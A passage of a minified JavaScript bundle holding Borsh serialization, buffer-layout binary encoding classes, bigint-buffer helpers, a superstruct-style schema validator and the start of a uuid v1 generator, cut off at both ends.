instanceof ir&&s.addToFieldPath(e),s}}function fb(n,e,t){if(typeof e.borshSerialize=="function"){e.borshSerialize(t);return}const r=n.get(e.constructor);if(!r)throw new ir(`Class ${e.constructor.name} is missing in schema`);if(r.kind==="struct")r.fields.map(([i,s])=>{Do(n,i,e[i],s,t)});else if(r.kind==="enum"){const i=e[r.field];for(let s=0;s<r.values.length;++s){const[o,a]=r.values[s];if(o===i){t.writeU8(s),Do(n,o,e[o],a,t);break}}}else throw new ir(`Unexpected schema kind: ${r.kind} for ${e.constructor.name}`)}function dL(n,e,t=ub){const r=new t;return fb(n,e,r),r.toArray()}var db=Ln.serialize=dL;function Oo(n,e,t,r){try{if(typeof t=="string")return r[`read${hb(t)}`]();if(t instanceof Array){if(typeof t[0]=="number")return r.readFixedArray(t[0]);if(typeof t[1]=="number"){const i=[];for(let s=0;s<t[1];s++)i.push(Oo(n,null,t[0],r));return i}else return r.readArray(()=>Oo(n,e,t[0],r))}if(t.kind==="option")return r.readU8()?Oo(n,e,t.type,r):void 0;if(t.kind==="map"){let i=new Map;const s=r.readU32();for(let o=0;o<s;o++){const a=Oo(n,e,t.key,r),l=Oo(n,e,t.value,r);i.set(a,l)}return i}return Ow(n,t,r)}catch(i){throw i instanceof ir&&i.addToFieldPath(e),i}}function Ow(n,e,t){if(typeof e.borshDeserialize=="function")return e.borshDeserialize(t);const r=n.get(e);if(!r)throw new ir(`Class ${e.name} is missing in schema`);if(r.kind==="struct"){const i={};for(const[s,o]of n.get(e).fields)i[s]=Oo(n,s,o,t);return new e(i)}if(r.kind==="enum"){const i=t.readU8();if(i>=r.values.length)throw new ir(`Enum index: ${i} is out of range`);const[s,o]=r.values[i],a=Oo(n,s,o,t);return new e({[s]:a})}throw new ir(`Unexpected schema kind: ${r.kind} for ${e.constructor.name}`)}function pL(n,e,t,r=Lr){const i=new r(t),s=Ow(n,e,i);if(i.offset<t.length)throw new ir(`Unexpected ${t.length-i.offset} bytes after deserialized data`);return s}var pb=Ln.deserialize=pL;function gL(n,e,t,r=Lr){const i=new r(t);return Ow(n,e,i)}lb=Ln.deserializeUnchecked=gL;var X={};Object.defineProperty(X,"__esModule",{value:!0});X.s16=X.s8=X.nu64be=X.u48be=X.u40be=X.u32be=X.u24be=X.u16be=Rn=X.nu64=X.u48=X.u40=Ae=X.u32=X.u24=Vr=X.u16=it=X.u8=Qo=X.offset=X.greedy=X.Constant=X.UTF8=X.CString=X.Blob=X.Boolean=X.BitField=X.BitStructure=X.VariantLayout=X.Union=X.UnionLayoutDiscriminator=X.UnionDiscriminator=X.Structure=X.Sequence=X.DoubleBE=X.Double=X.FloatBE=X.Float=X.NearInt64BE=X.NearInt64=X.NearUInt64BE=X.NearUInt64=X.IntBE=X.Int=X.UIntBE=X.UInt=X.OffsetLayout=X.GreedyCount=X.ExternalLayout=X.bindConstructorLayout=X.nameWithProperty=X.Layout=X.uint8ArrayToBuffer=X.checkUint8Array=void 0;X.constant=X.utf8=X.cstr=Rt=X.blob=X.unionLayoutDiscriminator=X.union=er=X.seq=X.bits=ve=X.struct=X.f64be=X.f64=X.f32be=X.f32=X.ns64be=X.s48be=X.s40be=X.s32be=X.s24be=X.s16be=Sr=X.ns64=X.s48=X.s40=X.s32=X.s24=void 0;const Bw=Le;function Ql(n){if(!(n instanceof Uint8Array))throw new TypeError("b must be a Uint8Array")}X.checkUint8Array=Ql;function rt(n){return Ql(n),Bw.Buffer.from(n.buffer,n.byteOffset,n.length)}X.uint8ArrayToBuffer=rt;class dt{constructor(e,t){if(!Number.isInteger(e))throw new TypeError("span must be an integer");this.span=e,this.property=t}makeDestinationObject(){return{}}getSpan(e,t){if(0>this.span)throw new RangeError("indeterminate span");return this.span}replicate(e){const t=Object.create(this.constructor.prototype);return Object.assign(t,this),t.property=e,t}fromArray(e){}}X.Layout=dt;function Uw(n,e){return e.property?n+"["+e.property+"]":n}X.nameWithProperty=Uw;function mL(n,e){if(typeof n!="function")throw new TypeError("Class must be constructor");if(Object.prototype.hasOwnProperty.call(n,"layout_"))throw new Error("Class is already bound to a layout");if(!(e&&e instanceof dt))throw new TypeError("layout must be a Layout");if(Object.prototype.hasOwnProperty.call(e,"boundConstructor_"))throw new Error("layout is already bound to a constructor");n.layout_=e,e.boundConstructor_=n,e.makeDestinationObject=()=>new n,Object.defineProperty(n.prototype,"encode",{value(t,r){return e.encode(this,t,r)},writable:!0}),Object.defineProperty(n,"decode",{value(t,r){return e.decode(t,r)},writable:!0})}X.bindConstructorLayout=mL;class pr extends dt{isCount(){throw new Error("ExternalLayout is abstract")}}X.ExternalLayout=pr;class gb extends pr{constructor(e=1,t){if(!Number.isInteger(e)||0>=e)throw new TypeError("elementSpan must be a (positive) integer");super(-1,t),this.elementSpan=e}isCount(){return!0}decode(e,t=0){Ql(e);const r=e.length-t;return Math.floor(r/this.elementSpan)}encode(e,t,r){return 0}}X.GreedyCount=gb;class jw extends pr{constructor(e,t=0,r){if(!(e instanceof dt))throw new TypeError("layout must be a Layout");if(!Number.isInteger(t))throw new TypeError("offset must be integer or undefined");super(e.span,r||e.property),this.layout=e,this.offset=t}isCount(){return this.layout instanceof qr||this.layout instanceof ci}decode(e,t=0){return this.layout.decode(e,t+this.offset)}encode(e,t,r=0){return this.layout.encode(e,t,r+this.offset)}}X.OffsetLayout=jw;class qr extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readUIntLE(t,this.span)}encode(e,t,r=0){return rt(t).writeUIntLE(e,r,this.span),this.span}}X.UInt=qr;class ci extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readUIntBE(t,this.span)}encode(e,t,r=0){return rt(t).writeUIntBE(e,r,this.span),this.span}}X.UIntBE=ci;class pa extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readIntLE(t,this.span)}encode(e,t,r=0){return rt(t).writeIntLE(e,r,this.span),this.span}}X.Int=pa;class Yl extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readIntBE(t,this.span)}encode(e,t,r=0){return rt(t).writeIntBE(e,r,this.span),this.span}}X.IntBE=Yl;const M0=Math.pow(2,32);function vp(n){const e=Math.floor(n/M0),t=n-e*M0;return{hi32:e,lo32:t}}function _p(n,e){return n*M0+e}class mb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32LE(t),s=r.readUInt32LE(t+4);return _p(s,i)}encode(e,t,r=0){const i=vp(e),s=rt(t);return s.writeUInt32LE(i.lo32,r),s.writeUInt32LE(i.hi32,r+4),8}}X.NearUInt64=mb;class yb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32BE(t),s=r.readUInt32BE(t+4);return _p(i,s)}encode(e,t,r=0){const i=vp(e),s=rt(t);return s.writeUInt32BE(i.hi32,r),s.writeUInt32BE(i.lo32,r+4),8}}X.NearUInt64BE=yb;class wb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32LE(t),s=r.readInt32LE(t+4);return _p(s,i)}encode(e,t,r=0){const i=vp(e),s=rt(t);return s.writeUInt32LE(i.lo32,r),s.writeInt32LE(i.hi32,r+4),8}}X.NearInt64=wb;class vb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readInt32BE(t),s=r.readUInt32BE(t+4);return _p(i,s)}encode(e,t,r=0){const i=vp(e),s=rt(t);return s.writeInt32BE(i.hi32,r),s.writeUInt32BE(i.lo32,r+4),8}}X.NearInt64BE=vb;class _b extends dt{constructor(e){super(4,e)}decode(e,t=0){return rt(e).readFloatLE(t)}encode(e,t,r=0){return rt(t).writeFloatLE(e,r),4}}X.Float=_b;class Eb extends dt{constructor(e){super(4,e)}decode(e,t=0){return rt(e).readFloatBE(t)}encode(e,t,r=0){return rt(t).writeFloatBE(e,r),4}}X.FloatBE=Eb;class Ib extends dt{constructor(e){super(8,e)}decode(e,t=0){return rt(e).readDoubleLE(t)}encode(e,t,r=0){return rt(t).writeDoubleLE(e,r),8}}X.Double=Ib;class Sb extends dt{constructor(e){super(8,e)}decode(e,t=0){return rt(e).readDoubleBE(t)}encode(e,t,r=0){return rt(t).writeDoubleBE(e,r),8}}X.DoubleBE=Sb;class Tb extends dt{constructor(e,t,r){if(!(e instanceof dt))throw new TypeError("elementLayout must be a Layout");if(!(t instanceof pr&&t.isCount()||Number.isInteger(t)&&0<=t))throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let i=-1;!(t instanceof pr)&&0<e.span&&(i=t*e.span),super(i,r),this.elementLayout=e,this.count=t}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0,i=this.count;if(i instanceof pr&&(i=i.decode(e,t)),0<this.elementLayout.span)r=i*this.elementLayout.span;else{let s=0;for(;s<i;)r+=this.elementLayout.getSpan(e,t+r),++s}return r}decode(e,t=0){const r=[];let i=0,s=this.count;for(s instanceof pr&&(s=s.decode(e,t));i<s;)r.push(this.elementLayout.decode(e,t)),t+=this.elementLayout.getSpan(e,t),i+=1;return r}encode(e,t,r=0){const i=this.elementLayout,s=e.reduce((o,a)=>o+i.encode(a,t,r+o),0);return this.count instanceof pr&&this.count.encode(e.length,t,r),s}}X.Sequence=Tb;class Ab extends dt{constructor(e,t,r){if(!(Array.isArray(e)&&e.reduce((s,o)=>s&&o instanceof dt,!0)))throw new TypeError("fields must be array of Layout instances");typeof t=="boolean"&&r===void 0&&(r=t,t=void 0);for(const s of e)if(0>s.span&&s.property===void 0)throw new Error("fields cannot contain unnamed variable-length layout");let i=-1;try{i=e.reduce((s,o)=>s+o.getSpan(),0)}catch{}super(i,t),this.fields=e,this.decodePrefixes=!!r}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0;try{r=this.fields.reduce((i,s)=>{const o=s.getSpan(e,t);return t+=o,i+o},0)}catch{throw new RangeError("indeterminate span")}return r}decode(e,t=0){Ql(e);const r=this.makeDestinationObject();for(const i of this.fields)if(i.property!==void 0&&(r[i.property]=i.decode(e,t)),t+=i.getSpan(e,t),this.decodePrefixes&&e.length===t)break;return r}encode(e,t,r=0){const i=r;let s=0,o=0;for(const a of this.fields){let l=a.span;if(o=0<l?l:0,a.property!==void 0){const u=e[a.property];u!==void 0&&(o=a.encode(u,t,r),0>l&&(l=a.getSpan(t,r)))}s=r,r+=l}return s+o-i}fromArray(e){const t=this.makeDestinationObject();for(const r of this.fields)r.property!==void 0&&0<e.length&&(t[r.property]=e.shift());return t}layoutFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(const t of this.fields)if(t.property===e)return t}offsetOf(e){if(typeof e!="string")throw new TypeError("property must be string");let t=0;for(const r of this.fields){if(r.property===e)return t;0>r.span?t=-1:0<=t&&(t+=r.span)}}}X.Structure=Ab;class Vw{constructor(e){this.property=e}decode(e,t){throw new Error("UnionDiscriminator is abstract")}encode(e,t,r){throw new Error("UnionDiscriminator is abstract")}}X.UnionDiscriminator=Vw;class yd extends Vw{constructor(e,t){if(!(e instanceof pr&&e.isCount()))throw new TypeError("layout must be an unsigned integer ExternalLayout");super(t||e.property||"variant"),this.layout=e}decode(e,t){return this.layout.decode(e,t)}encode(e,t,r){return this.layout.encode(e,t,r)}}X.UnionLayoutDiscriminator=yd;class Fw extends dt{constructor(e,t,r){let i;if(e instanceof qr||e instanceof ci)i=new yd(new jw(e));else if(e instanceof pr&&e.isCount())i=new yd(e);else if(e instanceof Vw)i=e;else throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");if(t===void 0&&(t=null),!(t===null||t instanceof dt))throw new TypeError("defaultLayout must be null or a Layout");if(t!==null){if(0>t.span)throw new Error("defaultLayout must have constant span");t.property===void 0&&(t=t.replicate("content"))}let s=-1;t&&(s=t.span,0<=s&&(e instanceof qr||e instanceof ci)&&(s+=i.layout.span)),super(s,r),this.discriminator=i,this.usesPrefixDiscriminator=e instanceof qr||e instanceof ci,this.defaultLayout=t,this.registry={};let o=this.defaultGetSourceVariant.bind(this);this.getSourceVariant=function(a){return o(a)},this.configGetSourceVariant=function(a){o=a.bind(this)}}getSpan(e,t=0){if(0<=this.span)return this.span;const r=this.getVariant(e,t);if(!r)throw new Error("unable to determine span for unrecognized variant");return r.getSpan(e,t)}defaultGetSourceVariant(e){if(Object.prototype.hasOwnProperty.call(e,this.discriminator.property)){if(this.defaultLayout&&this.defaultLayout.property&&Object.prototype.hasOwnProperty.call(e,this.defaultLayout.property))return;const t=this.registry[e[this.discriminator.property]];if(t&&(!t.layout||t.property&&Object.prototype.hasOwnProperty.call(e,t.property)))return t}else for(const t in this.registry){const r=this.registry[t];if(r.property&&Object.prototype.hasOwnProperty.call(e,r.property))return r}throw new Error("unable to infer src variant")}decode(e,t=0){let r;const i=this.discriminator,s=i.decode(e,t),o=this.registry[s];if(o===void 0){const a=this.defaultLayout;let l=0;this.usesPrefixDiscriminator&&(l=i.layout.span),r=this.makeDestinationObject(),r[i.property]=s,r[a.property]=a.decode(e,t+l)}else r=o.decode(e,t);return r}encode(e,t,r=0){const i=this.getSourceVariant(e);if(i===void 0){const s=this.discriminator,o=this.defaultLayout;let a=0;return this.usesPrefixDiscriminator&&(a=s.layout.span),s.encode(e[s.property],t,r),a+o.encode(e[o.property],t,r+a)}return i.encode(e,t,r)}addVariant(e,t,r){const i=new bb(this,e,t,r);return this.registry[e]=i,i}getVariant(e,t=0){let r;return e instanceof Uint8Array?r=this.discriminator.decode(e,t):r=e,this.registry[r]}}X.Union=Fw;class bb extends dt{constructor(e,t,r,i){if(!(e instanceof Fw))throw new TypeError("union must be a Union");if(!Number.isInteger(t)||0>t)throw new TypeError("variant must be a (non-negative) integer");if(typeof r=="string"&&i===void 0&&(i=r,r=null),r){if(!(r instanceof dt))throw new TypeError("layout must be a Layout");if(e.defaultLayout!==null&&0<=r.span&&r.span>e.defaultLayout.span)throw new Error("variant span exceeds span of containing union");if(typeof i!="string")throw new TypeError("variant must have a String property")}let s=e.span;0>e.span&&(s=r?r.span:0,0<=s&&e.usesPrefixDiscriminator&&(s+=e.discriminator.layout.span)),super(s,i),this.union=e,this.variant=t,this.layout=r||null}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0;this.union.usesPrefixDiscriminator&&(r=this.union.discriminator.layout.span);let i=0;return this.layout&&(i=this.layout.getSpan(e,t+r)),r+i}decode(e,t=0){const r=this.makeDestinationObject();if(this!==this.union.getVariant(e,t))throw new Error("variant mismatch");let i=0;return this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout?r[this.property]=this.layout.decode(e,t+i):this.property?r[this.property]=!0:this.union.usesPrefixDiscriminator&&(r[this.union.discriminator.property]=this.variant),r}encode(e,t,r=0){let i=0;if(this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout&&!Object.prototype.hasOwnProperty.call(e,this.property))throw new TypeError("variant lacks property "+this.property);this.union.discriminator.encode(this.variant,t,r);let s=i;if(this.layout&&(this.layout.encode(e[this.property],t,r+i),s+=this.layout.getSpan(t,r+i),0<=this.union.span&&s>this.union.span))throw new Error("encoded variant overruns containing union");return s}fromArray(e){if(this.layout)return this.layout.fromArray(e)}}X.VariantLayout=bb;function Oa(n){return 0>n&&(n+=4294967296),n}class zw extends dt{constructor(e,t,r){if(!(e instanceof qr||e instanceof ci))throw new TypeError("word must be a UInt or UIntBE layout");if(typeof t=="string"&&r===void 0&&(r=t,t=!1),4<e.span)throw new RangeError("word cannot exceed 32 bits");super(e.span,r),this.word=e,this.msb=!!t,this.fields=[];let i=0;this._packedSetValue=function(s){return i=Oa(s),this},this._packedGetValue=function(){return i}}decode(e,t=0){const r=this.makeDestinationObject(),i=this.word.decode(e,t);this._packedSetValue(i);for(const s of this.fields)s.property!==void 0&&(r[s.property]=s.decode(e));return r}encode(e,t,r=0){const i=this.word.decode(t,r);this._packedSetValue(i);for(const s of this.fields)if(s.property!==void 0){const o=e[s.property];o!==void 0&&s.encode(o)}return this.word.encode(this._packedGetValue(),t,r)}addField(e,t){const r=new Ww(this,e,t);return this.fields.push(r),r}addBoolean(e){const t=new xb(this,e);return this.fields.push(t),t}fieldFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(const t of this.fields)if(t.property===e)return t}}X.BitStructure=zw;class Ww{constructor(e,t,r){if(!(e instanceof zw))throw new TypeError("container must be a BitStructure");if(!Number.isInteger(t)||0>=t)throw new TypeError("bits must be positive integer");const i=8*e.span,s=e.fields.reduce((o,a)=>o+a.bits,0);if(t+s>i)throw new Error("bits too long for span remainder ("+(i-s)+" of "+i+" remain)");this.container=e,this.bits=t,this.valueMask=(1<<t)-1,t===32&&(this.valueMask=4294967295),this.start=s,this.container.msb&&(this.start=i-s-t),this.wordMask=Oa(this.valueMask<<this.start),this.property=r}decode(e,t){const r=this.container._packedGetValue();return Oa(r&this.wordMask)>>>this.start}encode(e){if(typeof e!="number"||!Number.isInteger(e)||e!==Oa(e&this.valueMask))throw new TypeError(Uw("BitField.encode",this)+" value must be integer not exceeding "+this.valueMask);const t=this.container._packedGetValue(),r=Oa(e<<this.start);this.container._packedSetValue(Oa(t&~this.wordMask)|r)}}X.BitField=Ww;let xb=class extends Ww{constructor(e,t){super(e,1,t)}decode(e,t){return!!super.decode(e,t)}encode(e){typeof e=="boolean"&&(e=+e),super.encode(e)}};X.Boolean=xb;class kb extends dt{constructor(e,t){if(!(e instanceof pr&&e.isCount()||Number.isInteger(e)&&0<=e))throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");let r=-1;e instanceof pr||(r=e),super(r,t),this.length=e}getSpan(e,t){let r=this.span;return 0>r&&(r=this.length.decode(e,t)),r}decode(e,t=0){let r=this.span;return 0>r&&(r=this.length.decode(e,t)),rt(e).slice(t,t+r)}encode(e,t,r){let i=this.length;if(this.length instanceof pr&&(i=e.length),!(e instanceof Uint8Array&&i===e.length))throw new TypeError(Uw("Blob.encode",this)+" requires (length "+i+") Uint8Array as src");if(r+i>t.length)throw new RangeError("encoding overruns Uint8Array");const s=rt(e);return rt(t).write(s.toString("hex"),r,i,"hex"),this.length instanceof pr&&this.length.encode(i,t,r),i}}X.Blob=kb;class Cb extends dt{constructor(e){super(-1,e)}getSpan(e,t=0){Ql(e);let r=t;for(;r<e.length&&e[r]!==0;)r+=1;return 1+r-t}decode(e,t=0){const r=this.getSpan(e,t);return rt(e).slice(t,t+r-1).toString("utf-8")}encode(e,t,r=0){typeof e!="string"&&(e=String(e));const i=Bw.Buffer.from(e,"utf8"),s=i.length;if(r+s>t.length)throw new RangeError("encoding overruns Buffer");const o=rt(t);return i.copy(o,r),o[r+s]=0,s+1}}X.CString=Cb;class Rb extends dt{constructor(e,t){if(typeof e=="string"&&t===void 0&&(t=e,e=void 0),e===void 0)e=-1;else if(!Number.isInteger(e))throw new TypeError("maxSpan must be an integer");super(-1,t),this.maxSpan=e}getSpan(e,t=0){return Ql(e),e.length-t}decode(e,t=0){const r=this.getSpan(e,t);if(0<=this.maxSpan&&this.maxSpan<r)throw new RangeError("text length exceeds maxSpan");return rt(e).slice(t,t+r).toString("utf-8")}encode(e,t,r=0){typeof e!="string"&&(e=String(e));const i=Bw.Buffer.from(e,"utf8"),s=i.length;if(0<=this.maxSpan&&this.maxSpan<s)throw new RangeError("text length exceeds maxSpan");if(r+s>t.length)throw new RangeError("encoding overruns Buffer");return i.copy(rt(t),r),s}}X.UTF8=Rb;class Mb extends dt{constructor(e,t){super(0,t),this.value=e}decode(e,t){return this.value}encode(e,t,r){return 0}}X.Constant=Mb;X.greedy=(n,e)=>new gb(n,e);var Qo=X.offset=(n,e,t)=>new jw(n,e,t),it=X.u8=n=>new qr(1,n),Vr=X.u16=n=>new qr(2,n);X.u24=n=>new qr(3,n);var Ae=X.u32=n=>new qr(4,n);X.u40=n=>new qr(5,n);X.u48=n=>new qr(6,n);var Rn=X.nu64=n=>new mb(n);X.u16be=n=>new ci(2,n);X.u24be=n=>new ci(3,n);X.u32be=n=>new ci(4,n);X.u40be=n=>new ci(5,n);X.u48be=n=>new ci(6,n);X.nu64be=n=>new yb(n);X.s8=n=>new pa(1,n);X.s16=n=>new pa(2,n);X.s24=n=>new pa(3,n);X.s32=n=>new pa(4,n);X.s40=n=>new pa(5,n);X.s48=n=>new pa(6,n);var Sr=X.ns64=n=>new wb(n);X.s16be=n=>new Yl(2,n);X.s24be=n=>new Yl(3,n);X.s32be=n=>new Yl(4,n);X.s40be=n=>new Yl(5,n);X.s48be=n=>new Yl(6,n);X.ns64be=n=>new vb(n);X.f32=n=>new _b(n);X.f32be=n=>new Eb(n);X.f64=n=>new Ib(n);X.f64be=n=>new Sb(n);var ve=X.struct=(n,e,t)=>new Ab(n,e,t);X.bits=(n,e,t)=>new zw(n,e,t);var er=X.seq=(n,e,t)=>new Tb(n,e,t);X.union=(n,e,t)=>new Fw(n,e,t);X.unionLayoutDiscriminator=(n,e)=>new yd(n,e);var Rt=X.blob=(n,e)=>new kb(n,e);X.cstr=n=>new Cb(n);X.utf8=(n,e)=>new Rb(n,e);X.constant=(n,e)=>new Mb(n,e);var rh={};Object.defineProperty(rh,"__esModule",{value:!0});function yL(n){{const e=Buffer.from(n);e.reverse();const t=e.toString("hex");return t.length===0?BigInt(0):BigInt(`0x${t}`)}}var wL=rh.toBigIntLE=yL;function vL(n){{const e=n.toString("hex");return e.length===0?BigInt(0):BigInt(`0x${e}`)}}rh.toBigIntBE=vL;function _L(n,e){{const t=n.toString(16),r=Buffer.from(t.padStart(e*2,"0").slice(0,e*2),"hex");return r.reverse(),r}}var EL=rh.toBufferLE=_L;function IL(n,e){{const t=n.toString(16);return Buffer.from(t.padStart(e*2,"0").slice(0,e*2),"hex")}}rh.toBufferBE=IL;class SL extends TypeError{constructor(e,t){let r;const{message:i,explanation:s,...o}=e,{path:a}=e,l=a.length===0?i:`At path: ${a.join(".")} -- ${i}`;super(s??l),s!=null&&(this.cause=l),Object.assign(this,o),this.name=this.constructor.name,this.failures=()=>r??(r=[e,...t()])}}function TL(n){return ih(n)&&typeof n[Symbol.iterator]=="function"}function ih(n){return typeof n=="object"&&n!=null}function wd(n){return ih(n)&&!Array.isArray(n)}function di(n){return typeof n=="symbol"?n.toString():typeof n=="string"?JSON.stringify(n):`${n}`}function AL(n){const{done:e,value:t}=n.next();return e?void 0:t}function bL(n,e,t,r){if(n===!0)return;n===!1?n={}:typeof n=="string"&&(n={message:n});const{path:i,branch:s}=e,{type:o}=t,{refinement:a,message:l=`Expected a value of type \`${o}\`${a?` with refinement \`${a}\``:""}, but received: \`${di(r)}\``}=n;return{value:r,type:o,refinement:a,key:i[i.length-1],path:i,branch:s,...n,message:l}}function*oE(n,e,t,r){TL(n)||(n=[n]);for(const i of n){const s=bL(i,e,t,r);s&&(yield s)}}function*$w(n,e,t={}){const{path:r=[],branch:i=[n],coerce:s=!1,mask:o=!1}=t,a={path:r,branch:i,mask:o};s&&(n=e.coercer(n,a));let l="valid";for(const u of e.validator(n,a))u.explanation=t.message,l="not_valid",yield[u,void 0];for(let[u,h,f]of e.entries(n,a)){const m=$w(h,f,{path:u===void 0?r:[...r,u],branch:u===void 0?i:[...i,h],coerce:s,mask:o,message:t.message});for(const v of m)v[0]?(l=v[0].refinement!=null?"not_refined":"not_valid",yield[v[0],void 0]):s&&(h=v[1],u===void 0?n=h:n instanceof Map?n.set(u,h):n instanceof Set?n.add(h):ih(n)&&(h!==void 0||u in n)&&(n[u]=h))}if(l!=="not_valid")for(const u of e.refiner(n,a))u.explanation=t.message,l="not_refined",yield[u,void 0];l==="valid"&&(yield[void 0,n])}let Pi=class{constructor(e){const{type:t,schema:r,validator:i,refiner:s,coercer:o=l=>l,entries:a=function*(){}}=e;this.type=t,this.schema=r,this.entries=a,this.coercer=o,i?this.validator=(l,u)=>{const h=i(l,u);return oE(h,u,this,l)}:this.validator=()=>[],s?this.refiner=(l,u)=>{const h=s(l,u);return oE(h,u,this,l)}:this.refiner=()=>[]}assert(e,t){return xL(e,this,t)}create(e,t){return de(e,this,t)}is(e){return Nb(e,this)}mask(e,t){return kL(e,this,t)}validate(e,t={}){return sh(e,this,t)}};function xL(n,e,t){const r=sh(n,e,{message:t});if(r[0])throw r[0]}function de(n,e,t){const r=sh(n,e,{coerce:!0,message:t});if(r[0])throw r[0];return r[1]}function kL(n,e,t){const r=sh(n,e,{coerce:!0,mask:!0,message:t});if(r[0])throw r[0];return r[1]}function Nb(n,e){return!sh(n,e)[0]}function sh(n,e,t={}){const r=$w(n,e,t),i=AL(r);return i[0]?[new SL(i[0],function*(){for(const o of r)o[0]&&(yield o[0])}),void 0]:[void 0,i[1]]}function ga(n,e){return new Pi({type:n,schema:null,validator:e})}function CL(){return ga("any",()=>!0)}function pe(n){return new Pi({type:"array",schema:n,*entries(e){if(n&&Array.isArray(e))for(const[t,r]of e.entries())yield[t,r,n]},coercer(e){return Array.isArray(e)?e.slice():e},validator(e){return Array.isArray(e)||`Expected an array value, but received: ${di(e)}`}})}function ki(){return ga("boolean",n=>typeof n=="boolean")}function Hw(n){return ga("instance",e=>e instanceof n||`Expected a \`${n.name}\` instance, but received: ${di(e)}`)}function $t(n){const e=di(n),t=typeof n;return new Pi({type:"literal",schema:t==="string"||t==="number"||t==="boolean"?n:null,validator(r){return r===n||`Expected the literal \`${e}\`, but received: ${di(r)}`}})}function RL(){return ga("never",()=>!1)}function ge(n){return new Pi({...n,validator:(e,t)=>e===null||n.validator(e,t),refiner:(e,t)=>e===null||n.refiner(e,t)})}function J(){return ga("number",n=>typeof n=="number"&&!isNaN(n)||`Expected a number, but received: ${di(n)}`)}function be(n){return new Pi({...n,validator:(e,t)=>e===void 0||n.validator(e,t),refiner:(e,t)=>e===void 0||n.refiner(e,t)})}function Pb(n,e){return new Pi({type:"record",schema:null,*entries(t){if(ih(t))for(const r in t){const i=t[r];yield[r,r,n],yield[r,i,e]}},validator(t){return wd(t)||`Expected an object, but received: ${di(t)}`},coercer(t){return wd(t)?{...t}:t}})}function ue(){return ga("string",n=>typeof n=="string"||`Expected a string, but received: ${di(n)}`)}function qw(n){const e=RL();return new Pi({type:"tuple",schema:null,*entries(t){if(Array.isArray(t)){const r=Math.max(n.length,t.length);for(let i=0;i<r;i++)yield[i,t[i],n[i]||e]}},validator(t){return Array.isArray(t)||`Expected an array, but received: ${di(t)}`},coercer(t){return Array.isArray(t)?t.slice():t}})}function se(n){const e=Object.keys(n);return new Pi({type:"type",schema:n,*entries(t){if(ih(t))for(const r of e)yield[r,t[r],n[r]]},validator(t){return wd(t)||`Expected an object, but received: ${di(t)}`},coercer(t){return wd(t)?{...t}:t}})}function ar(n){const e=n.map(t=>t.type).join(" | ");return new Pi({type:"union",schema:null,coercer(t,r){for(const i of n){const[s,o]=i.validate(t,{coerce:!0,mask:r.mask});if(!s)return o}return t},validator(t,r){const i=[];for(const s of n){const[...o]=$w(t,s,r),[a]=o;if(a[0])for(const[l]of o)l&&i.push(l);else return[]}return[`Expected the value to satisfy a union of \`${e}\`, but received: ${di(t)}`,...i]}})}function Zl(){return ga("unknown",()=>!0)}function oh(n,e,t){return new Pi({...n,coercer:(r,i)=>Nb(r,e)?n.coercer(t(r,i),i):n.coercer(r,i)})}var ef,ML=new Uint8Array(16);function Lb(){if(!ef&&(ef=typeof crypto<"u"&&crypto.getRandomValues&&crypto.getRandomValues.bind(crypto)||typeof msCrypto<"u"&&typeof msCrypto.getRandomValues=="function"&&msCrypto.getRandomValues.bind(msCrypto),!ef))throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");return ef(ML)}const NL=/^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;function Ep(n){return typeof n=="string"&&NL.test(n)}var Cn=[];for(var Kg=0;Kg<256;++Kg)Cn.push((Kg+256).toString(16).substr(1));function Ip(n){var e=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,t=(Cn[n[e+0]]+Cn[n[e+1]]+Cn[n[e+2]]+Cn[n[e+3]]+"-"+Cn[n[e+4]]+Cn[n[e+5]]+"-"+Cn[n[e+6]]+Cn[n[e+7]]+"-"+Cn[n[e+8]]+Cn[n[e+9]]+"-"+Cn[n[e+10]]+Cn[n[e+11]]+Cn[n[e+12]]+Cn[n[e+13]]+Cn[n[e+14]]+Cn[n[e+15]]).toLowerCase();if(!Ep(t))throw TypeError("Stringified UUID is invalid");return t}var aE,Gg,Qg=0,Yg=0;function PL(n,e,t){var r=e&&t||0,i=e||new Array(16);n=n||{};var s=n.node||aE,o=n.clockseq!==void 0?n.clockseq:Gg;if(s==null||o==null){var a=n.random||(n.rng||Lb)();s==null&&(s=aE=[a[0]|1,a[1],a[2],a[3],a[4],a[5]]),o==null&&(o=Gg=(a[6]<<8|a[7])&16383)}var l=n.msecs!==void 0?n.msecs:Date.now(),u=n.nsecs!==void 0?n.nsecs:Yg+1,h=l-Qg+(u-Yg)/1e4;if(h<0&&n.clockseq===void 0&&(o=o+1&16383),(h<0||l>Qg)&&n.nsecs===void 0&&(u=0),u>=1e4)throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");Qg=l,Yg=u,Gg=o,l+=122192928e5;var f=((l&268435455)*1e4+u)%4294967296;i[r++]=f>>>24&255,i[r++]=f>>>16&255,i[r++]=f>>>8&255,i[r++]=f&255;var 